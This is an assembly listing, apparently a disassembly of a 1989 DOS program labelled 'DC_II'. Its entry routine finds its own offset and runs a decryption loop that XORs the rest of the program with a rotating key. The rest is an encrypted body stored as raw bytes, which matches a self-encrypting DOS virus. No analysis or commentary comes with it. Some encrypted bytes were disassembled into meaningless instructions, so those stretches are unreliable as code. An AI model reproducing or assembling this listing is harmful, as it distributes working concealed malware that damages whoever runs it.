PAGE  60,132
  
;
;                                      
;                 DC_II                        
;                                      
;      Created:   25-Oct-89                            
;                                      
;
  
DATA_6E     EQU 0FFB5H              ; (6CAF:FFB5=4309H)
  
CODESEG     SEGMENT
        ASSUME  CS:CODESEG, DS:CODESEG
  
  
        ORG 100h
  
dc_ii       PROC    FAR
  
start:
        JMP LOC_1
DATA_1      DB  0CDH                ; Data table (indexed access)
        DB  21H
LOC_1:
        CALL    SUB_1
        DB  0FEH
  
dc_ii       ENDP
  
;
;                  SUBROUTINE
;
  
SUB_1       PROC    NEAR
        POP SI
        SUB SI,103H
        CMP SI,0
        JE  LOC_3               ; Jump if equal
        MOV DL,CS:DATA_1[SI]        ; (6CAF:0103=0CDH)
        LEA DI,DATA_2[SI]           ; (6CAF:0129=7) Load effective addr
        LEA CX,DATA_4[SI]           ; (6CAF:06EA=0B4H) Load effective addr
        LEA BX,DATA_3[SI]           ; (6CAF:0138=5) Load effective addr
        SUB CX,BX
        CLI                 ; Disable interrupts
  
LOCLOOP_2:
        MOV AL,CS:[BX]
        MOV BYTE PTR CS:[DI],22H        ; '"'
        XOR AL,DL
        ROR DL,1                ; Rotate
        MOV CS:[BX],AL
        INC BX
        MOV BYTE PTR CS:[DI],32H        ; '2'
        LOOP    LOCLOOP_2           ; Loop if cx > 0
  
        STI                 ; Enable interrupts
LOC_3:
        SAR BYTE PTR [BX+3BH],1     ; Shift w/sign fill
        ESC 4,DH
        JMP LOC_17
SUB_1       ENDP
  
        DB  0F0H, 60H, 0B8H, 52H, 53H, 1DH
        DB  0FDH, 44H, 7EH, 7FH, 0FH, 0DFH
        DB  13H, 4, 51H, 4DH, 0A2H, 51H
        DB  37H, 5BH, 5, 0F1H, 0D5H, 75H
        DB  7AH, 75H, 0B8H, 0F1H, 67H, 73H
        DB  0D1H, 0FAH, 73H, 0EBH, 0D5H, 0D8H
        DB  5BH, 0EDH, 36H, 0DCH, 0CDH, 0BFH
        DB  0A1H, 51H, 37H, 56H, 0FDH, 0FCH
        DB  0E1H, 42H, 0BFH, 0DFH, 9AH, 0FDH
        DB  0D5H, 3BH, 7AH, 0C3H, 0BEH, 0DFH
        DB  7FH, 1CH, 0F3H, 6DH, 0D0H, 0B9H
        DB  3BH, 63H, 0EEH, 0F6H, 6BH, 16H
        DB  0B3H, 0EFH, 0CAH, 0D3H, 4, 0F3H
        DB  0FBH, 0FDH, 84H, 7CH, 0C5H, 0DCH
        DB  0EFH, 0F7H, 0FBH, 0FDH, 0C3H, 77H
        DB  0BFH, 0DFH, 0EFH, 0F7H, 0FBH, 45H
        DB  0FEH, 33H, 72H, 0FEH, 0E3H, 0CAH
        DB  0FEH, 0FDH, 8AH, 64H, 5, 0F4H
        DB  0E3H, 0CAH, 0F9H, 0FDH, 8AH, 6CH
        DB  5, 3DH, 0E4H, 0CAH, 0F3H, 0FDH
        DB  8AH, 74H, 5, 0DFH, 0EFH, 0F5H
        DB  0FBH, 0FCH, 1, 73H, 0B5H, 0DEH
        DB  0C5H, 0D9H, 0BEH, 0A5H, 0BBH, 7FH
        DB  95H, 0F1H, 0ACH, 0B8H, 0B6H, 0FDH
        DB  0DEH, 7FH, 0BFH, 36H, 0EFH, 0F7H
        DB  78H, 3, 0FEH, 0AH, 0BCH, 36H
        DB  3AH, 0F7H, 0D5H, 76H, 7AH, 0E0H
        DB  0BEH, 0E2H, 0A2H, 0ADH, 8EH, 0F4H
        DB  0D0H, 0B9H, 3BH, 43H, 0EEH, 0F6H
        DB  10H, 0E6H, 6EH, 51H, 79H, 5BH
        DB  73H, 0F6H, 0FBH, 70H, 42H, 0E0H
        DB  0BEH, 64H, 0EFH, 0F6H, 42H, 0F3H
        DB  0FEH, 0F4H, 0BAH, 56H, 0E8H, 0B4H
        DB  0B8H, 0BAH, 0B9H, 9DH, 49H, 0F1H
        DB  64H, 73H, 6BH, 0FCH, 0D0H, 0F6H
        DB  3BH, 4DH, 0EEH, 0D9H, 70H, 79H
        DB  6AH, 7EH, 91H, 56H, 6BH, 61H
        DB  0FAH, 0D3H, 75H, 0FBH, 0AH, 0DEH
        DB  0C1H, 7EH, 7FH, 65H, 0FFH, 0CBH
        DB  95H, 12H, 0CEH, 0D9H, 0C2H, 69H
        DB  3FH, 7EH, 0C3H, 0DCH, 4, 8AH
        DB  6BH, 0D3H, 0C4H, 0FBH, 3, 0DEH
        DB  9AH, 0F4H, 10H, 8EH, 6EH, 0F2H
        DB  23H, 46H, 0EDH, 4EH, 0E1H, 0FDH
        DB  0D0H, 0F5H, 0A8H, 6BH, 0EDH, 3AH
        DB  0DAH, 0BEH, 1CH, 89H, 32H, 43H
        DB  5, 0F1H, 43H, 0FDH, 0FFH, 4CH
        DB  76H, 0F1H, 66H, 0F0H, 0B8H, 0BEH
        DB  0, 0BBH, 0FEH, 5CH, 16H, 0D7H
        DB  85H, 0EH, 73H, 0E3H, 55H, 0D9H
        DB  5AH, 0F7H, 41H, 7DH, 0FEH, 0CAH
        DB  0BFH, 6FH, 0EFH, 46H, 0FDH, 2FH
        DB  1EH, 0F5H, 77H, 5FH, 26H, 0F6H
        DB  43H, 0FDH, 0FBH, 0B2H, 0ACH, 0ADH
        DB  0E5H, 9, 3DH, 7DH, 0, 76H
        DB  0CAH, 3AH, 56H, 0F2H, 0FBH, 49H
        DB  0FCH, 0CDH, 0B8H, 12H, 0CEH, 15H
        DB  3, 16H, 0, 75H, 0B2H, 0F5H
        DB  0CFH, 0B3H, 0BAH, 0A9H, 0BFH, 3CH
        DB  0EDH, 96H, 0A2H, 0B2H, 0DBH, 0B4H
        DB  0B7H, 5FH, 0E9H, 96H, 0BDH, 0A2H
        DB  0A8H, 0DDH, 0D4H, 75H, 0B2H, 6BH
        DB  0F6H, 3AH, 0DAH, 0D3H, 76H, 0FBH
        DB  6DH, 0DEH, 5BH, 0B0H, 0C8H, 2FH
        DB  0A8H, 0F2H, 0BH, 34H, 0E9H, 3AH
        DB  0DAH, 0A3H, 0D0H, 0B9H, 3BH, 1CH
        DB  0EEH, 0F7H, 13H, 98H, 0FEH, 0F2H
        DB  23H, 62H, 0EEH, 47H, 0FBH, 0D3H
        DB  76H, 0FBH, 0D8H, 0DCH, 0C1H, 7DH
        DB  7FH, 3EH, 0FFH, 51H, 41H, 5BH
        DB  2CH, 0F6H, 63H, 0FEH, 26H, 51H
        DB  35H, 0D8H, 65H, 27H, 0C7H, 2
        DB  8BH, 7CH, 56H, 0E2H, 0ECH, 77H
        DB  1, 0FCH, 8BH, 6FH, 91H, 55H
        DB  6BH, 4BH, 0FAH, 0C1H, 0FFH, 0BH
        DB  71H, 0E3H, 0EDH, 82H, 0F8H, 14H
        DB  0C9H, 80H, 0BH, 0D1H, 22H, 0D6H
        DB  4FH, 0BAH, 4CH, 7FH, 0E9H, 52H
        DB  5BH, 0FCH, 0FCH, 30H, 0DFH, 21H
        DB  32H, 43H, 88H, 0F4H, 0D5H, 77H
        DB  0F9H, 43H, 0BCH, 0AAH, 0E8H, 47H
        DB  0FBH, 0D3H, 76H, 78H, 54H, 7AH
        DB  7, 0D5H, 0FAH, 15H, 60H, 7FH
        DB  0CCH, 0EBH, 4, 6CH, 0C8H, 3DH
        DB  0E0H, 0F1H, 67H, 64H, 7FH, 0F7H
        DB  70H, 0BAH, 0FCH, 51H, 36H, 5BH
        DB  65H, 0F6H, 70H, 0FAH, 0D0H, 0F6H
        DB  3BH, 53H, 0EEH, 7BH, 33H, 74H
        DB  0B9H
        DB  7DH
LOC_4:
        XOR BL,SS:DATA_6E[BP+DI]        ; (6CAF:FFB5=9)
        HLT                 ; Halt processor
        JC  LOC_4               ; Jump if carry Set
        LOOPZ   LOC_18              ; Loop if zf=1, cx>0
  
        JMP LOC_16
        DB  0F7H, 0A5H, 4DH, 0FDH, 51H, 37H
        DB  9BH, 0E6H, 0A9H, 34H, 0FDH, 47H
        DB  3FH, 0BFH, 89H, 0A0H, 0B8H, 0B4H
        DB  3AH, 0FBH, 5FH, 0E3H, 54H, 1CH
        DB  0BH, 57H, 57H, 0B7H, 43H, 0BFH
        DB  0AAH, 16H, 0A9H, 4FH, 0C6H, 73H
        DB  0EBH, 95H, 0D8H, 22H, 0D6H, 13H
        DB  35H, 0FEH, 97H, 0FBH, 0DFH, 9CH
        DB  2DH, 4FH, 0C6H, 73H, 0EBH, 0B5H
        DB  0D8H, 22H, 0D6H, 0D5H, 3, 7AH
        DB  0C4H, 0BEH, 37H, 0DDH, 0F7H, 88H
        DB  0FEH, 17H, 0F0H, 0BDH, 0F1H, 65H
        DB  73H, 40H, 0FCH, 0C2H, 7FH, 0CAH
        DB  0DAH, 6CH, 34H, 0F2H, 16H, 49H
        DB  0CBH, 0F0H, 8FH, 22H, 0D6H, 0A3H
        DB  8EH, 0FDH, 96H, 0AAH, 20H, 0BFH
        DB  43H, 0D4H, 30H, 0DFH, 0FCH, 7CH
        DB  0CAH, 5FH, 0E7H, 0D5H, 0C5H, 0F9H
        DB  27H, 0CAH, 3AH, 11H, 3FH, 10H
        DB  25H, 73H, 0C3H, 94H, 0D8H, 56H
        DB  0CDH, 0FBH, 4DH, 0FEH, 83H, 4CH
        DB  75H, 5BH, 0B0H, 0ADH, 0CEH, 2CH
        DB  0F2H, 0BH, 0F4H, 0E8H, 3AH, 0DAH
        DB  0A3H, 2, 0F2H, 3, 0F4H, 0E8H
        DB  4EH, 0BBH, 0FDH, 4EH, 7FH, 4DH
        DB  71H, 9BH, 0F5H, 2, 3EH, 0B1H
        DB  30H, 35H, 0DAH, 0D3H, 0ABH, 8FH
        DB  0FEH, 0B9H, 0CFH, 0E3H, 0F1H, 67H
        DB  0F2H, 0BCH, 4DH, 0D4H, 51H, 37H
        DB  0DAH, 0A8H, 47H, 0D5H, 0D3H, 76H
        DB  7AH, 0F8H, 6FH, 0C5H, 0D9H, 73H
        DB  0F8H, 0B9H, 0F2H, 2BH, 0F5H, 0E8H
        DB  43H, 0B5H, 44H, 0EEH, 7FH, 72H
        DB  0FEH, 9CH, 0F6H, 38H, 49H, 0D1H
        DB  79H, 72H, 0FEH, 6CH, 34H, 0EEH
        DB  4DH, 0EEH, 59H, 87H, 0D8H, 0E8H
        DB  82H, 0E9H, 5, 4AH, 50H, 0B9H
        DB  12H, 0CEH, 74H, 38H, 0E3H, 4EH
        DB  51H, 91H, 0E7H, 0E8H, 0F0H, 8FH
        DB  0FCH, 3DH, 0CBH, 0F0H, 12H, 0CEH
        DB  84H, 23H, 4, 3DH, 0CBH, 0F1H
        DB  66H, 0E8H, 0F7H, 76H, 69H, 3AH
        DB  7EH, 72H, 0FEH, 9DH, 0E6H, 13H
        DB  0D0H, 0FEH, 0CBH, 0F0H, 66H, 0E8H
        DB  0F7H, 36H, 0DCH, 8CH, 7AH, 57H
        DB  0FEH, 0EFH, 1CH, 9, 70H, 6AH
        DB  0B5H, 0BEH, 6BH, 0A1H, 4EH, 0FCH
        DB  0FDH, 33H, 5EH, 0CDH, 0CEH, 7
        DB  0F8H, 0FBH, 49H, 0B1H, 0C6H, 0B8H
        DB  0DFH, 22H, 0D6H, 89H, 0F8H, 16H
        DB  7CH, 0BFH, 34H, 1DH, 34H, 4FH
        DB  0D2H, 0F8H, 0B2H, 9EH, 5CH, 2CH
        DB  0E8H, 0DDH, 77H, 0F9H, 78H, 83H
        DB  9DH, 9AH, 0F6H, 38H, 49H, 0D1H
        DB  79H, 72H, 0FEH, 6CH, 34H, 0EDH
        DB  0DBH, 75H, 70H, 3CH, 1CH, 0EDH
        DB  0D1H, 70H, 0EAH, 0F9H, 0F5H, 7EH
        DB  0FBH, 0FH, 7DH, 1BH, 0ACH, 47H
        DB  7AH, 0BFH, 0DH, 7, 0AEH, 0F1H
        DB  39H, 0FAH, 7AH, 85H, 1EH, 9BH
        DB  0F2H, 71H, 35H, 15H, 7DH, 2FH
        DB  1CH, 0B7H, 0AFH, 0AAH, 0AFH, 0E0H
        DB  79H, 0BH, 0F0H, 22H, 0D6H, 77H
        DB  3DH, 70H, 0A7H, 57H, 0C3H, 0EEH
        DB  84H, 0FCH, 0FAH, 0E1H, 25H, 0E6H
        DB  36H, 4, 0AH, 70H, 2EH, 7DH
        DB  0BDH, 0A1H, 67H, 0EDH, 0CAH, 36H
        DB  0DCH, 75H, 0A7H, 0B8H, 0C0H, 5BH
        DB  0C8H, 76H, 69H, 61H, 7EH, 6
        DB  0C3H, 0EFH, 3AH, 0DAH, 0D3H, 74H
        DB  0DBH, 20H, 0DEH, 0C1H, 7DH, 7FH
        DB  5DH, 0FFH, 42H, 0E5H, 92H, 9BH
        DB  0F4H, 12H, 64H, 0FEH, 51H, 34H
        DB  5BH, 5CH, 0F6H, 0D5H
LOC_5:
        JZ  LOC_6               ; Jump if zero
        OUT DX,AX               ; port 0, DMA-1 bas&add ch 0
        MOV SI,64F1H
        JNC LOC_19              ; Jump if carry=0
        CLD                 ; Clear direction
        SAL DH,1                ; Shift w/zeros fill
        CMP CX,[BP+DI-12H]
        ESC 1,DATA_7[BX+SI]         ; (6CAF:0079=0)
        JNS LOC_20              ; Jump if not sign
        JLE LOC_5               ; Jump if < or =
        IN  AL,DX               ; port 0, DMA-1 bas&add ch 0
        XOR AL,0C4H
        XOR CH,[SI]
        DB  2EH             ; CS:
        CMC                 ; Complement carry
        JNC LOC_21              ; Jump if carry=0
        AAA                 ; Ascii adjust
        JZ  LOC_22              ; Jump if zero
        STD                 ; Set direction flag
        MOV BH,[BX+DI+3EH]
        SBB AL,0EFH
        OUT 19H,AX              ; port 19H
        POP ES
        DEC DI
        JBE LOC_23              ; Jump if below or =
        AAS                 ; Ascii adjust
        PUSH    SI
        DB  0F3H, 0FBH, 0D3H, 75H, 0EBH, 18H
        DB  0DEH, 3CH, 15H, 0ABH, 0D6H, 3CH
        DB  51H, 36H, 43H, 5AH, 0F6H, 0D5H
        DB  74H, 62H, 0D2H, 0BEH, 0F1H, 66H
        DB  73H, 48H, 0FCH, 47H, 7FH, 0BDH
        DB  0F1H, 66H, 7BH, 5AH, 0FCH, 47H
        DB  81H, 40H, 0F1H, 66H, 7BH, 54H
        DB  0FCH, 0D0H, 0F4H, 33H, 7CH, 0EEH
        DB  74H, 3AH, 0FEH, 0D0H, 0F6H, 33H
        DB  7CH, 0EEH, 26H, 10H, 2CH, 15H
        DB  0AEH, 54H, 0EH, 4, 71H, 24H
        DB  76H, 35H, 25H, 7, 0DFH, 0ADH
        DB  0ACH, 36H, 0DCH, 16H, 7AH, 0BEH
LOC_6:
        DB  67H, 0EFH, 0B5H, 0C8H, 34H, 0CDH
        DB  0ADH
        DB  72H, 0FEH, 5BH, 0B7H, 42H, 0E1H
        DB  0FEH, 0F2H, 2BH, 40H, 0EEH, 3AH
        DB  0DAH, 16H, 0C9H, 0EFH, 7, 0DDH
        DB  0ADH, 0C4H, 32H, 0CEH
        DB  2CH
        DB  0B2H, 9EH, 37H, 0DH, 0F7H, 43H
        DB  0FDH, 0BCH, 4CH, 76H, 0ECH, 3DH
        DB  3AH, 0DAH, 49H, 0D1H, 2CH, 0B9H
        DB  12H, 0CEH
        DB  74H, 38H, 0E7H, 0D8H, 0F4H, 0B8H
        DB  0D8H, 0B4H, 0DAH, 0F8H, 0FDH, 0D0H
        DB  0F6H, 3BH, 0BH, 0EEH, 43H, 0BBH
        DB  44H, 0FDH, 7FH, 32H, 4BH, 3CH
        DB  0F6H, 36H, 0DCH, 0A4H, 26H, 7
        DB  0DEH, 0B8H, 3AH, 0DAH, 49H, 0C0H
        DB  0B2H, 9EH, 37H, 0C3H, 0F7H, 4FH
        DB  0C6H, 73H, 0EBH, 0B5H, 0D8H, 22H
        DB  0D6H, 10H, 0C7H, 6EH, 0CBH, 90H
        DB  0D9H, 0BCH, 3AH, 0DAH, 76H, 2DH
        DB  0FCH, 7DH, 0C1H, 57H, 0F7H, 0B8H
        DB  30H, 0DFH, 24H, 0B8H, 0F1H, 66H
        DB  7BH, 2BH, 0FCH, 7FH, 9EH, 41H
        DB  0DFH, 57H, 0F6H, 0B8H, 30H, 0DFH
        DB  0BCH, 91H, 54H, 63H, 27H, 0FAH
        DB  49H, 0D1H, 79H, 0ECH, 12H, 0CEH
        DB  7CH, 28H, 7EH, 3CH, 61H, 7
        DB  0DEH, 0ACH
        DB  3AH
        DB  0DAH, 0A6H, 0F9H, 0BCH, 0BH, 0D1H
        DB  0C1H, 7DH, 6FH, 2FH, 0FFH, 0B2H
        DB  9EH, 6BH, 0D4H, 7AH, 6FH, 17H
        DB  0F8H, 0B2H, 9EH, 37H, 0D5H, 0F7H
        DB  0FCH, 0E2H, 4AH, 65H, 5
LOC_12:
        POP DI
        OUT DX,AX               ; port 0, DMA-1 bas&add ch 0
        CMP BL,DL
        JBE LOC_13              ; Jump if below or =
        INC DX
        MOV DI,9BDFH
        RCL BP,1                ; Rotate thru carry
        JA  LOC_24              ; Jump if above
        JCXZ    LOC_25              ; Jump if cx=0
        JCXZ    LOC_12              ; Jump if cx=0
        AND BL,0D3H
        JNZ LOC_26              ; Jump if not zero
        SUB SI,BX
        DB  0C1H, 7CH, 67H, 65H, 0FFH, 71H
        DB  0E6H, 0F4H, 24H, 0F4H, 33H, 0ACH
        DB  0D0H, 0F4H, 3BH, 4DH, 0EEH, 0A7H
        DB  30H, 46H, 0FEH, 7EH, 40H, 3CH
        DB  5BH, 0BBH, 36H, 0DCH, 0CDH, 0BFH
        DB  0A1H, 51H, 37H, 4CH, 6BH, 0FDH
        DB  0D0H
LOC_13:
        HLT                 ; Halt processor
        CMP DX,[DI-12H]
        JLE LOC_12              ; Jump if < or =
        PUSH    WORD PTR [DI-5]
        XOR BX,SI
        DB  66H, 0F0H, 0E4H, 3EH, 0ADH, 0F2H
        DB  33H, 0F5H, 0E8H, 7CH, 2AH, 70H
        DB  62H, 0C6H, 0B9H, 0F4H, 24H, 74H
        DB  12H, 0BDH, 0D0H, 0F5H, 0B8H, 58H
        DB  35H, 0D9H, 73H, 0FAH, 79H, 0A5H
        DB  0FCH, 9DH, 0DH, 5, 10H, 8FH
        DB  6EH, 97H, 0B0H, 0DFH, 0B4H, 7AH
        DB  77H, 17H, 0F8H, 0F2H, 2BH, 0DFH
        DB  0EEH, 0DCH, 31H, 49H, 0BEH, 0B2H
        DB  9EH, 0F1H, 65H, 63H, 0F8H, 0FCH
        DB  0ADH, 0F2H, 33H, 35H, 0E9H, 7AH
        DB  67H, 0C5H, 0FFH, 54H, 74H, 0F1H
        DB  65H, 0F0H, 0C9H, 3FH, 2EH, 0B5H
        DB  91H, 57H, 0E8H
DATA_4      DB  0B4H                ; Data table (indexed access)
        DB  19H, 0EH, 0A5H, 0BCH
  
CODESEG     ENDS
  
  
  
        END START
        